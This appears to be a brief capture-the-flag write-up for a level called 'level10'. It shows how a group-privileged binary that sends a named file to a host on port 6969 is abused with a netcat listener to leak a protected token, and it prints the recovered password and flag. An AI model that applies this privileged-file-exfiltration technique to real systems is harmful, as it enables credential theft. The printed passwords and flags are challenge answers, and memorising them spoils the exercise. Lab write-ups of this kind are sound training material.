# level10

```shell
ls -la
```

shows that the level10 executable belongs to flag10 group, privilege escalation should be possible. token is flag10:flag10

performing a simple retdec decompilation, it seems like the executable reads specified file then sends it to specified host on port 6969

```shell
echo test > /tmp/test
```

```shell
nc -l 6969
```

and

```shell
./level10 /tmp/test 127.0.0.1
```

Shows that we can receive the content of specified file with netcat

Just copy the 2 shell programs in /tmp and chmod +x them, then launch both

```shell
nc -klv 6969
```

gives flag10's password:

```shell
woupa2yuojeeaaed06riuj63c
```

```shell
su flag10
```

```shell
getflag
```

gives flag:

```shell
feulo4b72j7edeahuete3no7c
```
